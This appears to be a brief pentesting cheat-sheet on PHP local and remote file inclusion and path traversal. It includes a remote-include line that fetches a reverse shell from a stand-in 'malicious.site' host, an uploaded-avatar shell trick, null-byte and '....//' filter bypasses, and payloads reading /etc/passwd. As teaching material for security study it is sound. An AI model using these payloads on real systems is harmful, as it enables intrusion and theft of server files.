# Files/Paths exploits

<hr class="sl">

## File inclusion

<div class="row row-cols-md-2"><div>

Files inclusion refer to websites that are importing <small>(`import/require` in PHP)</small> a file using the user input. For instance: `http://malicious.site/?lang=FR` that is doing a include using `$_GET["lang"]`.

In the following include with no filtering, we may enter a path 

```php
include "lang/$_GET[lang].php"
```

**PHP < 5.3.4**: if the programmer appended an extension, such as `.php`, but you want to bypass it, you can use the **Null Byte** `%00` which indicates the end of a string.

```php
include "xxx.elf%00.php" // include xxx.elf
```

</div><div>

**Local File Inclusion (LFI)** 🏠: inject a local file

```php
// you uploaded a reverse shell (avatar.png)
// as your avatar
include "../uploads/avatar.png.php"
```

See Path traversal.

**Remote File Inclusion (RFI)** ✈️: inject a remote file

```php
// allow_url_fopen MUST BE SET TO true
include "http://malicious.site/reverse_shell.php"
```
</div></div>

<hr class="sr">

## Path/directory traversal

<div class="row row-cols-md-2"><div>

This is an attack where a hacker will manage to access files/folders that were not supposed to be available for users by exploiting the application. 

In PHP for instance, developers may be use `file_get_contents(URL)` to download an avatar for instance given a URL. The problem is that this kind of function may be used to access a local file. If the file is displayed, or stored somewhere where you can read it such as in `/uploads`, then you may be able to 

* test if a port is open
* access private files such as `/etc/passwd`/`windows/win.ini`
* ...

For instance, a URL such as `http://example.com/image-preview.php?url=...` that is supposed to display an image given a URL, may be vulnerable to path traversal.
</div><div>

You can use the **dot-dot-slash attack**, and give an URL such as `../../../../../etc/passwd`. Note that `/../` is `/`, so if you add more `../` than needed, it's OK.


**Bypass filters**: if you know that a filter will replace a string, then you may create a string that will do what you want AFTER being filtered, such as `....//`. If the filter is removing `../`, then after filtering `..` and `/` will be concatenated, giving us back `../`.
</div></div>